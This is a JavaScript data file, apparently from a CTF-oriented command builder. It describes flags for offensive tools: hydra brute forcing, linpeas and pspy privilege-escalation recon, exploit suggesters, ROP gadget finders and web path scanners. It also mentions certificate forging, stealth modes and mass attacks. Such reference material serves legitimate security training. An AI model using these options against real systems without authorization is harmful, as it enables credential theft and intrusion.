      { id:'_ca_pfx', flag:'-ca-pfx', help: M('CA certificate+key for forging (Golden Certificate).', 'CA certificate+key for forging (Golden Certificate).'), value:'ca.pfx' },
      { id:'_subject', flag:'-subject', help: M('Subject of the forged certificate.', 'Subject of the forged certificate.'), value:'CN=Administrator' },
      { id:'_serial', flag:'-serial', help: M('Serial number of the forged certificate.', 'Serial number of the forged certificate.'), value:'1' },
    ],
  },
  {
    id: 'hydra',
    name: 'hydra',
    base: 'hydra',
    desc: M('Быстрый параллельный брут сетевых сервисов: SSH, FTP, RDP, SMB, HTTP-формы, БД и десятки протоколов. Логины/пароли из словарей против сервиса на цели.', 'A fast parallel brute-forcer for network services: SSH, FTP, RDP, SMB, HTTP forms, databases, and dozens of other protocols. Brute-forces logins and passwords from wordlists against a service on the target.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_l', flag:'-l', help: M('A single login.', 'A single login.'), value:'admin' },
      { id:'_p', flag:'-p', help: M('A single password.', 'A single password.'), value:'password' },
      { id:'_c', flag:'-C', help: M('File with login:password pairs (instead of -L/-P).', 'File with login:password pairs (instead of -L/-P).'), value:'combos.txt' },
      { id:'_e', flag:'-e', help: M('Extra checks: n - empty password, s - password=login, r - reversed login.', 'Extra checks: n - empty password, s - password=login, r - reversed login.'), value:'nsr' },
      { id:'_u', flag:'-u', help: M('Iterate logins first, then passwords (the default is the other way around).', 'Iterate logins first, then passwords (the default is the other way around).') },
      { id:'_s', flag:'-s', help: M('Non-standard service port.', 'Non-standard service port.'), value:'2222' },
      { id:'_m', flag:'-M', help: M('File with a list of targets (mass attack).', 'File with a list of targets (mass attack).'), value:'targets.txt' },
      { id:'_4', flag:'-4', help: M('IPv4 only.', 'IPv4 only.') },
      { id:'_6', flag:'-6', help: M('IPv6 only.', 'IPv6 only.') },
      { id:'_t', flag:'-t', help: M('Number of parallel tasks per target (for SSH lower it to ~4).', 'Number of parallel tasks per target (for SSH lower it to ~4).'), value:'16' },
      { id:'_w', flag:'-w', help: M('Response wait timeout (seconds).', 'Response wait timeout (seconds).'), value:'30' },
      { id:'_f', flag:'-f', help: M('Stop after the first valid login:password pair on a host.', 'Stop after the first valid login:password pair on a host.') },
      { id:'_o', flag:'-o', help: M('Write found credentials to a file.', 'Write found credentials to a file.'), value:'found.txt' },
      { id:'_b', flag:'-b', help: M('Output file format: text, json, jsonv1.', 'Output file format: text, json, jsonv1.'), value:'text' },
      { id:'_v', flag:'-V', help: M('Show every login:password attempt (very verbose).', 'Show every login:password attempt (very verbose).') },
      { id:'_r', flag:'-R', help: M('Restore an interrupted session from hydra.restore.', 'Restore an interrupted session from hydra.restore.') },
      { id:'_i', flag:'-I', help: M('Ignore the restore file (start over).', 'Ignore the restore file (start over).') },
      { id:'_x', flag:'-x', help: M('Generate passwords: min:max:charset (a-letters, 1-digits, !-special characters).', 'Generate passwords: min:max:charset (a-letters, 1-digits, !-special characters).'), value:'6:8:a1' },
    ],
  },
  {
    id: 'linpeas-sh',
    name: './linpeas.sh',
    base: './linpeas.sh',
    desc: M('Скрипт recon: сам собирает всё для privesc (SUID, cron, права, креды, kernel, конфиги) и подсвечивает по цвету. Первое после получения shell.', 'A recon script: automatically collects everything on the machine that could lead to privilege escalation (SUID, cron, permissions, credentials, kernel, configs) and highlights findings by color. The first thing to run after getting a shell.'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'_a', flag:'-a', help: M('All checks (except regex): digs deeper - process monitoring, password search, user brute. Recommended for CTF, but slower (5-10 min).', 'All checks (except regex): digs deeper - process monitoring, password search, user brute. Recommended for CTF, but slower (5-10 min).') },
      { id:'_s', flag:'-s', help: M('Stealth and fast mode: skips long checks, writes nothing to disk (fewer traces).', 'Stealth and fast mode: skips long checks, writes nothing to disk (fewer traces).') },
      { id:'_e', flag:'-e', help: M('Extra enumeration - additional checks beyond the defaults.', 'Extra enumeration - additional checks beyond the defaults.') },
      { id:'_r', flag:'-r', help: M('Enable regex search (API keys, credentials). Slow and noisy, separate from -a.', 'Enable regex search (API keys, credentials). Slow and noisy, separate from -a.') },
      { id:'_o', flag:'-o', help: M('Run only the selected check groups (comma-separated).', 'Run only the selected check groups (comma-separated).'), value:'SysI,Devs' },
      { id:'_l', flag:'-L', help: M('Force linpeas to run (force execution) if auto-detection gets in the way.', 'Force linpeas to run (force execution) if auto-detection gets in the way.') },
      { id:'_p', flag:'-P', help: M('Pass the current user\'s password - it will be used for sudo -l and brute-forcing other users.', 'Pass the current user\'s password - it will be used for sudo -l and brute-forcing other users.'), value:'password' },
      { id:'_d', flag:'-D', help: M('Debug mode: show failed checks and timings (diagnostics).', 'Debug mode: show failed checks and timings (diagnostics).') },
      { id:'_w', flag:'-w', help: M('Pause between major check blocks (read the output in parts).', 'Pause between major check blocks (read the output in parts).') },
      { id:'_t', flag:'-t', help: M('Automatic network scan and internet access check.', 'Automatic network scan and internet access check.') },
      { id:'_i', flag:'-i', help: M('Scan a specific IP for open ports.', 'Scan a specific IP for open ports.'), value:'{TARGET}' },
      { id:'_n', flag:'-N', help: M('No colors - convenient when saving to a file.', 'No colors - convenient when saving to a file.') },
      { id:'_q', flag:'-q', help: M('Do not show the banner.', 'Do not show the banner.') },
      { id:'_h', flag:'-h', help: M('Show flag help.', 'Show flag help.') },
    ],
  },
  {
    id: 'pspy64',
    name: './pspy64',
    base: './pspy64',
    desc: M('Ловит запуски процессов и FS-события БЕЗ root. Видит cron, команды других пользователей и скрипты в момент запуска — поиск привилегированных cron/timer.', 'Sniffs process launches and file system events WITHOUT root rights. Catches cron jobs, other users\' commands, and scripts at the moment of execution - the main tool for finding privileged cron jobs/timers.'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'_p', flag:'-p', help: M('Print commands (processes) to stdout. Enabled by default; disable with -p=false.', 'Print commands (processes) to stdout. Enabled by default; disable with -p=false.') },
      { id:'_f', flag:'-f', help: M('Print file system events (inotify) to stdout. Disabled by default.', 'Print file system events (inotify) to stdout. Disabled by default.') },
      { id:'_c', flag:'-c', help: M('Color commands by process UID (file system events are not colored).', 'Color commands by process UID (file system events are not colored).') },
      { id:'_i', flag:'-i', help: M('Interval in milliseconds between procfs scans. Smaller means a better chance of catching short-lived processes (default 100ms, not counting inotify events).', 'Interval in milliseconds between procfs scans. Smaller means a better chance of catching short-lived processes (default 100ms, not counting inotify events).'), value:'100' },
      { id:'_r', flag:'-r', help: M('Watch a directory recursively (including subdirectories) via inotify. Repeatable. Default: /usr /tmp /etc /home /var /opt.', 'Watch a directory recursively (including subdirectories) via inotify. Repeatable. Default: /usr /tmp /etc /home /var /opt.'), value:'/etc' },
      { id:'_d', flag:'-d', help: M('Watch ONLY the directory itself, without subdirectories (non-recursive). Repeatable.', 'Watch ONLY the directory itself, without subdirectories (non-recursive). Repeatable.'), value:'/tmp' },
      { id:'__debug', flag:'--debug', help: M('Verbose error messages that are otherwise hidden.', 'Verbose error messages that are otherwise hidden.') },
    ],
  },
  {
    id: 'linux-exploit-suggester-sh',
    name: './linux-exploit-suggester.sh',
    base: './linux-exploit-suggester.sh',
    desc: M('Сверяет версию kernel/OS со списком публичных эксплойтов и выдаёт ранжированный список CVE со ссылками. Быстрая проверка kernel-exploit privesc.', 'Matches the kernel/OS version against a list of publicly known exploits and produces a ranked list of applicable CVEs with links. A quick check for kernel-exploit privesc.'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'__kernel', flag:'--kernel', help: M('Assess exploits for the specified kernel version (without running on the machine itself).', 'Assess exploits for the specified kernel version (without running on the machine itself).'), value:'3.2.0' },
      { id:'__uname', flag:'--uname', help: M('Assess based on a provided uname -a string (analysis from another machine).', 'Assess based on a provided uname -a string (analysis from another machine).'), value:'uname-string' },
      { id:'__pkglist_file', flag:'--pkglist-file', help: M('File with a list of installed packages (to check userspace exploits offline).', 'File with a list of installed packages (to check userspace exploits offline).'), value:'pkgs.txt' },
      { id:'__cvelist_file', flag:'--cvelist-file', help: M('Your own file with a list of CVEs to match against.', 'Your own file with a list of CVEs to match against.'), value:'cves.txt' },
      { id:'__kernelspace_only', flag:'--kernelspace-only', help: M('Show only kernel-level (kernelspace) exploits.', 'Show only kernel-level (kernelspace) exploits.') },
      { id:'__userspace_only', flag:'--userspace-only', help: M('Show only userspace exploits (sudo, pkexec, etc.).', 'Show only userspace exploits (sudo, pkexec, etc.).') },
      { id:'_d', flag:'-d', help: M('Also show DoS exploits (--show-dos), hidden by default.', 'Also show DoS exploits (--show-dos), hidden by default.') },
      { id:'__skip_more_checks', flag:'--skip-more-checks', help: M('Skip additional applicability checks (faster, but more false positives).', 'Skip additional applicability checks (faster, but more false positives).') },
      { id:'__skip_pkg_versions', flag:'--skip-pkg-versions', help: M('Do not compare package versions during assessment.', 'Do not compare package versions during assessment.') },
      { id:'_f', flag:'-f', help: M('Full output (--full): all available information for each exploit.', 'Full output (--full): all available information for each exploit.') },
      { id:'_g', flag:'-g', help: M('Short/compact output (--short).', 'Short/compact output (--short).') },
      { id:'__checksec', flag:'--checksec', help: M('Show the state of the system\'s protection mechanisms (an OS analog of checksec).', 'Show the state of the system\'s protection mechanisms (an OS analog of checksec).') },
      { id:'_b', flag:'-b', help: M('Download ready-made exploit binaries (--fetch-binaries).', 'Download ready-made exploit binaries (--fetch-binaries).') },
      { id:'_s', flag:'-s', help: M('Download exploit sources (--fetch-sources).', 'Download exploit sources (--fetch-sources).') },
      { id:'_v', flag:'-V', help: M('Show the tool version (--version).', 'Show the tool version (--version).') },
      { id:'_h', flag:'-h', help: M('Help (--help).', 'Help (--help).') },
    ],
  },
  {
    id: 'checksec',
    name: 'checksec',
    base: 'checksec',
    desc: M('Показывает защиты ELF/PE: RELRO, Stack Canary, NX, PIE, FORTIFY, RPATH. Первый шаг pwn-задачи — какие техники эксплуатации доступны.', 'Shows which protection mechanisms are enabled in an ELF/PE: RELRO, Stack Canary, NX, PIE, FORTIFY, RPATH. The first step in analyzing a pwn task - it determines which exploitation techniques are applicable.'),
    targetPlaceholder: '--file={TARGET}',
    flags: [
      { id:'__file', flag:'--file', help: M('Check the protections of the specified binary (classic syntax: --file=./bin).', 'Check the protections of the specified binary (classic syntax: --file=./bin).'), value:'{TARGET}' },
      { id:'__dir', flag:'--dir', help: M('Check all executable files in a directory.', 'Check all executable files in a directory.'), value:'/usr/bin' },
      { id:'__proc', flag:'--proc', help: M('Check the protections of a running process by name.', 'Check the protections of a running process by name.'), value:'nginx' },
      { id:'__proc_all', flag:'--proc-all', help: M('Check all running processes.', 'Check all running processes.') },
      { id:'__kernel', flag:'--kernel', help: M('Show the state of Linux kernel protections and hardening config options.', 'Show the state of Linux kernel protections and hardening config options.') },
      { id:'__fortify_file', flag:'--fortify-file', help: M('Check FORTIFY_SOURCE for a file (which functions are protected).', 'Check FORTIFY_SOURCE for a file (which functions are protected).'), value:'{TARGET}' },
      { id:'__fortify_proc', flag:'--fortify-proc', help: M('Check FORTIFY for a process by PID.', 'Check FORTIFY for a process by PID.'), value:'1234' },
      { id:'__format', flag:'--format', help: M('Output format: cli (default), csv, xml, json (in the Go version the flag is --output).', 'Output format: cli (default), csv, xml, json (in the Go version the flag is --output).'), value:'json' },
      { id:'__output', flag:'--output', help: M('Same as --format, in the new Go version: cli/json/xml/yaml.', 'Same as --format, in the new Go version: cli/json/xml/yaml.'), value:'json' },
      { id:'__extended', flag:'--extended', help: M('Extended output (additional binary properties).', 'Extended output (additional binary properties).') },
    ],
  },
  {
    id: 'gadget',
    name: 'ROPgadget',
    base: 'ROPgadget',
    desc: M('Ищет в бинаре ROP/JOP gadgets (цепочки до ret/jmp) для цепочек в обход NX. Может собрать ropchain на execve(/bin/sh).', 'Searches a binary for ROP/JOP gadgets (short instruction chains ending in ret/jmp) to build exploitation chains that bypass NX. Can automatically assemble a ropchain for execve(/bin/sh).'),
    targetPlaceholder: '--binary {TARGET}',
    flags: [
      { id:'__binary', flag:'--binary', help: M('Binary to analyze (ELF/PE/Mach-O).', 'Binary to analyze (ELF/PE/Mach-O).'), value:'{TARGET}' },
      { id:'__ropchain', flag:'--ropchain', help: M('Automatically assemble a ROP chain (execve /bin/sh) and output a ready-made Python script.', 'Automatically assemble a ROP chain (execve /bin/sh) and output a ready-made Python script.') },
      { id:'__depth', flag:'--depth', help: M('Gadget search depth in bytes (default 10).', 'Gadget search depth in bytes (default 10).'), value:'10' },
      { id:'__all', flag:'--all', help: M('Do not remove duplicate gadgets from the output.', 'Do not remove duplicate gadgets from the output.') },
      { id:'__dump', flag:'--dump', help: M('Show the gadget bytes (opcodes).', 'Show the gadget bytes (opcodes).') },
      { id:'__only', flag:'--only', help: M('Show only gadgets with these instructions (separated by |). E.g. \'pop|ret\'.', 'Show only gadgets with these instructions (separated by |). E.g. \'pop|ret\'.'), value:'pop|ret' },
      { id:'__filter', flag:'--filter', help: M('Exclude gadgets with these mnemonics.', 'Exclude gadgets with these mnemonics.'), value:'jmp|call' },
      { id:'__range', flag:'--range', help: M('Search for gadgets only in this address range.', 'Search for gadgets only in this address range.'), value:'0x400000-0x401000' },
      { id:'__badbytes', flag:'--badbytes', help: M('Discard gadgets whose address contains these bytes (separated by |).', 'Discard gadgets whose address contains these bytes (separated by |).'), value:'00|0a' },
      { id:'__re', flag:'--re', help: M('Filter gadgets by a regular expression.', 'Filter gadgets by a regular expression.'), value:'regexp' },
      { id:'__align', flag:'--align', help: M('Only gadgets with addresses aligned to N bytes.', 'Only gadgets with addresses aligned to N bytes.'), value:'4' },
      { id:'__string', flag:'--string', help: M('Search for a string in readable segments (addresses for arguments).', 'Search for a string in readable segments (addresses for arguments).'), value:'/bin/sh' },
      { id:'__memstr', flag:'--memstr', help: M('Find the address of each byte of the string separately (when the whole string is absent).', 'Find the address of each byte of the string separately (when the whole string is absent).'), value:'/bin/sh' },
      { id:'__opcode', flag:'--opcode', help: M('Search for an opcode (hex) in the executable segment.', 'Search for an opcode (hex) in the executable segment.'), value:'c3' },
      { id:'__nojop', flag:'--nojop', help: M('Do not search for JOP gadgets (jmp/call).', 'Do not search for JOP gadgets (jmp/call).') },
      { id:'__nosys', flag:'--nosys', help: M('Do not search for syscall gadgets.', 'Do not search for syscall gadgets.') },
      { id:'__norop', flag:'--norop', help: M('Do not search for ROP gadgets (when only JOP/sys are needed).', 'Do not search for ROP gadgets (when only JOP/sys are needed).') },
      { id:'__multibr', flag:'--multibr', help: M('Allow gadgets with multiple branches (longer, but more options).', 'Allow gadgets with multiple branches (longer, but more options).') },
      { id:'__callpreceded', flag:'--callPreceded', help: M('Only gadgets preceded by a call (to bypass CFG).', 'Only gadgets preceded by a call (to bypass CFG).') },
      { id:'__rawarch', flag:'--rawArch', help: M('Architecture for a raw file without a header (x86/x64/arm/arm64...).', 'Architecture for a raw file without a header (x86/x64/arm/arm64...).'), value:'x86' },
      { id:'__rawmode', flag:'--rawMode', help: M('Bitness for a raw file (32/64).', 'Bitness for a raw file (32/64).'), value:'64' },
    ],
  },
  {
    id: 'one-gadget',
    name: 'one_gadget',
    base: 'one_gadget',
    desc: M('Ищет «магические» адреса (one-gadget) в libc: прыжок сразу даёт execve("/bin/sh") без аргументов. Нужен при leak libc и одном write (GOT/return).', 'Finds \'magic\' addresses (one-gadget) in libc, jumping to which immediately yields execve("/bin/sh") without arguments. Indispensable when you have a libc address leak and a single write (GOT/return).'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_b', flag:'-b', help: M('Search by libc BuildID[sha1] (when the file itself is absent but the build-id is known). An alternative to the positional file.', 'Search by libc BuildID[sha1] (when the file itself is absent but the build-id is known). An alternative to the positional file.'), value:'BuildID' },
      { id:'_f', flag:'-f', help: M('Force searching gadgets in the file rather than by build-id (--force-file).', 'Force searching gadgets in the file rather than by build-id (--force-file).') },
      { id:'_l', flag:'-l', help: M('Output level (--level): how many gadgets to show. Default 0 (only the most reliable); higher means more candidates.', 'Output level (--level): how many gadgets to show. Default 0 (only the most reliable); higher means more candidates.'), value:'1' },
      { id:'_o', flag:'-o', help: M('Output format (--output-format): pretty (default), raw, json.', 'Output format (--output-format): pretty (default), raw, json.'), value:'raw' },
      { id:'_r', flag:'-r', help: M('Alias for -o raw: output only gadget offsets separated by spaces (handy for scripts).', 'Alias for -o raw: output only gadget offsets separated by spaces (handy for scripts).') },
      { id:'__base', flag:'--base', help: M('libc base address - output absolute addresses instead of offsets.', 'libc base address - output absolute addresses instead of offsets.'), value:'0x7f0000000000' },
      { id:'_n', flag:'-n', help: M('Sort gadgets by proximity to the specified functions or to the file\'s GOT functions (--near).', 'Sort gadgets by proximity to the specified functions or to the file\'s GOT functions (--near).'), value:'system' },
    ],
  },
  {
    id: 'patchelf',
    name: 'patchelf',
    base: 'patchelf',
    desc: M('Меняет interpreter (ld-linux), RPATH и зависимости (DT_NEEDED) в готовом ELF. В pwn — запуск с нужной libc/loader без пересборки.', 'Changes the interpreter (ld-linux), RPATH, and dependencies (DT_NEEDED) in a prebuilt ELF. In pwn tasks it lets you run a binary with the required libc/loader version without recompiling.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'__set_interpreter', flag:'--set-interpreter', help: M('Replace the dynamic loader (ELF interpreter) with the specified one - run with the required ld.', 'Replace the dynamic loader (ELF interpreter) with the specified one - run with the required ld.'), value:'./ld-2.31.so' },
      { id:'__print_interpreter', flag:'--print-interpreter', help: M('Show the binary\'s current interpreter.', 'Show the binary\'s current interpreter.') },
      { id:'__replace_needed', flag:'--replace-needed', help: M('Replace a declared dependency with another (two arguments: old new).', 'Replace a declared dependency with another (two arguments: old new).'), value:'libc.so.6 ./libc.so.6' },
      { id:'__add_needed', flag:'--add-needed', help: M('Add a new required library.', 'Add a new required library.'), value:'./libc.so.6' },
      { id:'__remove_needed', flag:'--remove-needed', help: M('Remove a dependency (DT_NEEDED). Can be used multiple times.', 'Remove a dependency (DT_NEEDED). Can be used multiple times.'), value:'libfoo.so' },
      { id:'__print_needed', flag:'--print-needed', help: M('Show the list of required libraries.', 'Show the list of required libraries.') },
      { id:'__set_rpath', flag:'--set-rpath', help: M('Set RPATH/RUNPATH (where to look for libc) - e.g. \'.\' to take libc from the current folder.', 'Set RPATH/RUNPATH (where to look for libc) - e.g. \'.\' to take libc from the current folder.'), value:'.' },
      { id:'__add_rpath', flag:'--add-rpath', help: M('Add a path to the existing RPATH.', 'Add a path to the existing RPATH.'), value:'.' },
      { id:'__print_rpath', flag:'--print-rpath', help: M('Show the current RPATH.', 'Show the current RPATH.') },
      { id:'__remove_rpath', flag:'--remove-rpath', help: M('Remove the RPATH entirely.', 'Remove the RPATH entirely.') },
      { id:'__force_rpath', flag:'--force-rpath', help: M('Use DT_RPATH instead of DT_RUNPATH (old search behavior).', 'Use DT_RPATH instead of DT_RUNPATH (old search behavior).') },
      { id:'__set_soname', flag:'--set-soname', help: M('Change the SONAME of a shared library.', 'Change the SONAME of a shared library.'), value:'libc.so.6' },
      { id:'__print_soname', flag:'--print-soname', help: M('Show the library\'s SONAME.', 'Show the library\'s SONAME.') },
      { id:'__output', flag:'--output', help: M('Write the result to a new file without touching the original.', 'Write the result to a new file without touching the original.'), value:'patched' },
      { id:'__page_size', flag:'--page-size', help: M('Specify the target architecture\'s page size (for cross-patching).', 'Specify the target architecture\'s page size (for cross-patching).'), value:'4096' },
      { id:'__version', flag:'--version', help: M('Show the patchelf version.', 'Show the patchelf version.') },
    ],
  },
  {
    id: 'feroxbuster',
    name: 'feroxbuster',
    base: 'feroxbuster',
    desc: M('Быстрый рекурсивный content-сканер на Rust. Брут директорий/файлов, по умолчанию вытаскивает ссылки из ответов и ходит рекурсивно. Режимы --smart/--thorough.', 'Fast recursive content scanner in Rust. Brute-forces directories and files, by default extracts links from responses and automatically recurses. Convenient auto modes (--smart/--thorough).'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Target URL (short/long: -u/--url). Repeatable.', 'Target URL (short/long: -u/--url). Repeatable.'), value:'{TARGET}' },
      { id:'_w', flag:'-w', help: M('Wordlist path or URL (-w/--wordlist).', 'Wordlist path or URL (-w/--wordlist).'), value:'wordlist.txt' },
      { id:'__stdin', flag:'--stdin', help: M('Read a list of URLs from STDIN.', 'Read a list of URLs from STDIN.') },
      { id:'__resume_from', flag:'--resume-from', help: M('Resume an unfinished scan from a state file.', 'Resume an unfinished scan from a state file.'), value:'ferox.state' },
      { id:'__request_file', flag:'--request-file', help: M('Raw HTTP request as a template for all requests.', 'Raw HTTP request as a template for all requests.'), value:'req.txt' },
      { id:'__burp', flag:'--burp', help: M('Proxy to http://127.0.0.1:8080 + disable TLS verification (one command for Burp).', 'Proxy to http://127.0.0.1:8080 + disable TLS verification (one command for Burp).') },
      { id:'__burp_replay', flag:'--burp-replay', help: M('Send only unfiltered (found) requests to Burp.', 'Send only unfiltered (found) requests to Burp.') },
      { id:'__smart', flag:'--smart', help: M('Enables --auto-tune, --collect-words and --collect-backups.', 'Enables --auto-tune, --collect-words and --collect-backups.') },
      { id:'__thorough', flag:'--thorough', help: M('Like --smart, plus --collect-extensions and --scan-dir-listings (the maximum-effort mode).', 'Like --smart, plus --collect-extensions and --scan-dir-listings (the maximum-effort mode).') },
      { id:'__data_urlencoded', flag:'--data-urlencoded', help: M('POST with Content-Type form-urlencoded and this body (@file supported).', 'POST with Content-Type form-urlencoded and this body (@file supported).'), value:'user=admin' },
      { id:'_x', flag:'-x', help: M('Extensions to search for (-x/--extensions), comma- or space-separated, without the dot. @file also works.', 'Extensions to search for (-x/--extensions), comma- or space-separated, without the dot. @file also works.'), value:'php,html,txt' },
      { id:'_h', flag:'-H', help: M('HTTP headers (-H/--headers). Repeatable.', 'HTTP headers (-H/--headers). Repeatable.'), value:'Header: value' },
      { id:'_b', flag:'-b', help: M('Cookies (-b/--cookies).', 'Cookies (-b/--cookies).'), value:'name=value' },
      { id:'_q', flag:'-Q', help: M('URL query parameters (-Q/--query).', 'URL query parameters (-Q/--query).'), value:'token=stuff' },
      { id:'_m', flag:'-m', help: M('HTTP method(s) (-m/--methods), default GET.', 'HTTP method(s) (-m/--methods), default GET.'), value:'GET' },
      { id:'__data', flag:'--data', help: M('Request body (@file supported to read from a file).', 'Request body (@file supported to read from a file).'), value:'body' },
      { id:'_a', flag:'-a', help: M('User-Agent (-a/--user-agent).', 'User-Agent (-a/--user-agent).'), value:'Mozilla/5.0' },
      { id:'_f', flag:'-f', help: M('Append a / to every URL (-f/--add-slash).', 'Append a / to every URL (-f/--add-slash).') },
      { id:'_s', flag:'-s', help: M('Status code whitelist (-s/--status-codes): show only these. Default - all.', 'Status code whitelist (-s/--status-codes): show only these. Default - all.'), value:'200,301,302' },
      { id:'_c', flag:'-C', help: M('Status code blacklist (-C/--filter-status): hide these.', 'Status code blacklist (-C/--filter-status): hide these.'), value:'404,403' },
      { id:'_n', flag:'-N', help: M('Hide by the number of lines (-N/--filter-lines).', 'Hide by the number of lines (-N/--filter-lines).'), value:'20' },
      { id:'__filter_similar_to', flag:'--filter-similar-to', help: M('Hide pages similar to the given one (fighting soft-404).', 'Hide pages similar to the given one (fighting soft-404).'), value:'{TARGET}/soft404' },
      { id:'_d', flag:'-D', help: M('Do not auto-filter wildcard responses (-D/--dont-filter).', 'Do not auto-filter wildcard responses (-D/--dont-filter).') },
      { id:'__force_recursion', flag:'--force-recursion', help: M('Force recursion into all found endpoints.', 'Force recursion into all found endpoints.') },
      { id:'_e', flag:'-e', help: M('Extract links from the response body (-e/--extract-links); ON by default.', 'Extract links from the response body (-e/--extract-links); ON by default.') },
      { id:'__dont_extract_links', flag:'--dont-extract-links', help: M('Do not extract links from responses.', 'Do not extract links from responses.') },
      { id:'_t', flag:'-t', help: M('Number of threads (-t/--threads), default 50.', 'Number of threads (-t/--threads), default 50.'), value:'50' },
      { id:'_l', flag:'-L', help: M('Limit on concurrent scans (-L/--scan-limit), 0 = no limit.', 'Limit on concurrent scans (-L/--scan-limit), 0 = no limit.'), value:'4' },
      { id:'__rate_limit', flag:'--rate-limit', help: M('Requests-per-second limit per directory.', 'Requests-per-second limit per directory.'), value:'100' },
      { id:'__dont_scan', flag:'--dont-scan', help: M('URLs/regexps excluded from recursion and scanning.', 'URLs/regexps excluded from recursion and scanning.'), value:'logout' },
      { id:'__auto_tune', flag:'--auto-tune', help: M('Automatically slow down on a spike in errors.', 'Automatically slow down on a spike in errors.') },
      { id:'__auto_bail', flag:'--auto-bail', help: M('Automatically stop the scan on a spike in errors.', 'Automatically stop the scan on a spike in errors.') },
      { id:'__scan_dir_listings', flag:'--scan-dir-listings', help: M('Force recursion into directory listings.', 'Force recursion into directory listings.') },
      { id:'_g', flag:'-g', help: M('Extract meaningful words from responses and add them to the wordlist (-g/--collect-words).', 'Extract meaningful words from responses and add them to the wordlist (-g/--collect-words).') },
      { id:'_i', flag:'-I', help: M('Extensions ignored during auto-collection (-I/--dont-collect).', 'Extensions ignored during auto-collection (-I/--dont-collect).'), value:'html,php' },
      { id:'_k', flag:'-k', help: M('Disable TLS certificate verification (-k/--insecure). Needed for self-signed on HTB.', 'Disable TLS certificate verification (-k/--insecure). Needed for self-signed on HTB.') },
      { id:'_r', flag:'-r', help: M('Follow redirects (-r/--redirects).', 'Follow redirects (-r/--redirects).') },
      { id:'_p', flag:'-p', help: M('Proxy (-p/--proxy): http(s):// or socks5://.', 'Proxy (-p/--proxy): http(s):// or socks5://.'), value:'http://127.0.0.1:8080' },
      { id:'_o', flag:'-o', help: M('Output file (-o/--output); with --json - JSON records.', 'Output file (-o/--output); with --json - JSON records.'), value:'out.txt' },
      { id:'__json', flag:'--json', help: M('Write logs/output as JSON.', 'Write logs/output as JSON.') },
      { id:'__silent', flag:'--silent', help: M('URLs only and no logs (for piping into other tools).', 'URLs only and no logs (for piping into other tools).') },
      { id:'_v', flag:'-v', help: M('Increase verbosity (-v/--verbosity, repeatable).', 'Increase verbosity (-v/--verbosity, repeatable).') },
    ],
  },
  {
    id: 'dirsearch',
    name: 'dirsearch',
    base: 'dirsearch',
    desc: M('Гибкий Python-сканер путей. Брут директорий/файлов, плейсхолдер %EXT%, рекурсия, фильтры по code/size/text, разный output.', 'Flexible Python web path scanner. Brute-forces directories and files, supports the %EXT% placeholder for extensions, recursion, rich filtering by code/size/text and output in various formats.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Target URL (-u/--url). Repeatable.', 'Target URL (-u/--url). Repeatable.'), value:'{TARGET}' },
      { id:'_l', flag:'-l', help: M('File with a list of URLs (-l/--urls-file).', 'File with a list of URLs (-l/--urls-file).'), value:'urls.txt' },
      { id:'__stdin', flag:'--stdin', help: M('Read URLs from STDIN.', 'Read URLs from STDIN.') },
      { id:'__cidr', flag:'--cidr', help: M('Target is a subnet in CIDR format (e.g. 10.0.0.0/24).', 'Target is a subnet in CIDR format (e.g. 10.0.0.0/24).'), value:'{TARGET}' },
      { id:'__raw', flag:'--raw', help: M('Load a raw HTTP request from a file (requires --scheme).', 'Load a raw HTTP request from a file (requires --scheme).'), value:'req.txt' },
      { id:'_s', flag:'-s', help: M('Session file for resuming (-s/--session).', 'Session file for resuming (-s/--session).'), value:'session' },
      { id:'_w', flag:'-w', help: M('Wordlists or folders, comma-separated (-w/--wordlists). Default - db/dicc.txt.', 'Wordlists or folders, comma-separated (-w/--wordlists). Default - db/dicc.txt.'), value:'wordlist.txt' },
      { id:'_e', flag:'-e', help: M('Comma-separated list of extensions (-e/--extensions). Fills in %EXT% in the wordlist.', 'Comma-separated list of extensions (-e/--extensions). Fills in %EXT% in the wordlist.'), value:'php,html,js' },
      { id:'_f', flag:'-f', help: M('Append extensions and a / to every word (-f/--force-extensions).', 'Append extensions and a / to every word (-f/--force-extensions).') },
      { id:'__overwrite_extensions', flag:'--overwrite-extensions', help: M('Replace the words\' existing extension with yours.', 'Replace the words\' existing extension with yours.') },
      { id:'__exclude_extensions', flag:'--exclude-extensions', help: M('Exclude these extensions.', 'Exclude these extensions.'), value:'html' },
      { id:'__prefixes', flag:'--prefixes', help: M('Prepend prefixes to all words.', 'Prepend prefixes to all words.'), value:'admin_' },
      { id:'__suffixes', flag:'--suffixes', help: M('Append suffixes to all words.', 'Append suffixes to all words.'), value:'~' },
      { id:'_i', flag:'-i', help: M('Show only these codes (-i/--include-status). Ranges allowed.', 'Show only these codes (-i/--include-status). Ranges allowed.'), value:'200,301,302' },
      { id:'_x', flag:'-x', help: M('Hide these codes (-x/--exclude-status).', 'Hide these codes (-x/--exclude-status).'), value:'404,403' },
      { id:'__exclude_sizes', flag:'--exclude-sizes', help: M('Hide responses by size (comma-separated).', 'Hide responses by size (comma-separated).'), value:'0B,123GB' },
      { id:'__exclude_text', flag:'--exclude-text', help: M('Hide responses containing this text. Repeatable.', 'Hide responses containing this text. Repeatable.'), value:'Not Found' },
      { id:'__exclude_regex', flag:'--exclude-regex', help: M('Hide responses by a regexp.', 'Hide responses by a regexp.'), value:'regexp' },
      { id:'_r', flag:'-r', help: M('Recursive brute-forcing (-r/--recursive).', 'Recursive brute-forcing (-r/--recursive).') },
      { id:'__recursion_status', flag:'--recursion-status', help: M('Codes that trigger recursion (default 200-399,401,403).', 'Codes that trigger recursion (default 200-399,401,403).'), value:'200-399,401,403' },
      { id:'__subdirs', flag:'--subdirs', help: M('Scan the given subdirectories of the target.', 'Scan the given subdirectories of the target.'), value:'admin/' },
      { id:'__min_response_size', flag:'--min-response-size', help: M('Minimum response length to show.', 'Minimum response length to show.'), value:'100' },
      { id:'__max_response_size', flag:'--max-response-size', help: M('Maximum response length to show.', 'Maximum response length to show.'), value:'100000' },
      { id:'_m', flag:'-m', help: M('HTTP method (-m/--http-method), default GET.', 'HTTP method (-m/--http-method), default GET.'), value:'GET' },
